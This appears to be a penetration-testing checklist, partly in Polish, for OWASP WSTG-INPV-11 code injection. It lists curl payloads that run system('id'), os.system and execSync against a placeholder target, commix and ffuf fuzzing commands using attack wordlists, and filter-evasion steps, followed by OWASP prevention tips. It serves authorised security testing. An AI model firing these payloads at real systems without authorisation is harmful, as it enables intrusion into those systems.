# WSTG-INPV-11 — Testing for Code Injection

## Cele

- Identify injection points where you can inject code into the application
- Assess the injection severity

## KOMENDY

### PHP code injection

```bash
curl -s "https://TARGET/page?input=phpinfo()"
curl -s "https://TARGET/page?input=system('id')"
curl -s "https://TARGET/page?input=${system('id')}"
curl -s "https://TARGET/page?input=';phpinfo();//"

```

### Python code injection

```bash
curl -s "https://TARGET/eval?expr=__import__('os').system('id')"
curl -s "https://TARGET/eval?expr=exec('import os;os.system(\"id\")')"

```

### Node.js code injection

```bash
curl -s "https://TARGET/eval?expr=require('child_process').execSync('id')"

```

### commix - automatyczny skaner

```bash
commix -u "https://TARGET/page?input=test" --batch

```

## KOMENDY Z WORDLISTAMI

### fuzzdb OS command execution (code context)

```bash
ffuf -u "https://TARGET/page?input=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/os-cmd-execution/command-execution-unix.txt -mc all -o output_ffuf_code_inj.json

```

### PayloadsAllTheThings Command Injection (powiazane)

```bash
ffuf -u "https://TARGET/page?input=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Command Injection/Intruder/command_exec.txt" -mc all -o output_ffuf_cmd_exec.json

```

### SecLists command injection

```bash
ffuf -u "https://TARGET/page?input=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/command-injection-commix.txt -mc all -o output_ffuf_commix.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj parametry ktore moga byc ewaluowane (eval, exec, include)
2. Testuj wstrzykiwanie kodu specyficznego dla jezyka backendu
3. Sprawdz odpowiedzi pod katem wykonania kodu (output komendy id, phpinfo)
4. Testuj rozne enkodowania do obejscia filtrow
5. Uzyj Burp Intruder z listami payloadow


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Injection_Prevention_Cheat_Sheet.md

- Unikaj eval(), exec(), system() i podobnych funkcji dynamicznego wykonywania kodu
- Uzywaj sandboxed execution environments jesli dynamiczny kod jest wymagany
- Waliduj typy danych scisle — nie akceptuj stringow gdzie oczekiwane sa liczby/bool
- Uzywaj allowlist dopuszczalnych wartosci zamiast blacklist

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Backslash Powered Scanner | Wykrywanie nieznanych klas injection przez analize odpowiedzi | [GitHub](https://github.com/PortSwigger/backslash-powered-scanner) |
